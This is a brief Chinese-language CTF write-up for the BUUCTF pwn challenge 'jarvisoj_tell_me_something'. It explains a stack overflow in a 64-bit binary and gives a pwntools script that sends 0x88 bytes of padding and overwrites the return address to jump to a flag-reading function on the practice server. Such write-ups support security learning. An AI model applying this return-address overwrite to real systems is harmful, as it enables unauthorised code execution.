---
title: "BUUCTF Pwn Jarvisoj_tell_me_something"
date: 2020-04-09T20:16:37+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_tell_me_something

考点：栈溢出

![image-20200409203446244](/images/image-20200409203446244.png)

64位程序，开启nx

![image-20200409201854306](/images/image-20200409201854306.png)

存在一个函数读flag

![image-20200409201923037](/images/image-20200409201923037.png)

栈溢出到good_game()来读flag

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
sh = remote('node3.buuoj.cn',25264)
offset = 0x88
fakerbp = 0x8 #这里retn之前没有leave指令，所以没有rbp需要覆盖，栈填满之后直接覆盖retn
flag_addr = 0x400620
payload = 'a'*offset + p64(flag_addr)
sh.sendlineafter("message:",payload)
sh.interactive()
```

![image-20200409202344428](/images/image-20200409202344428.png)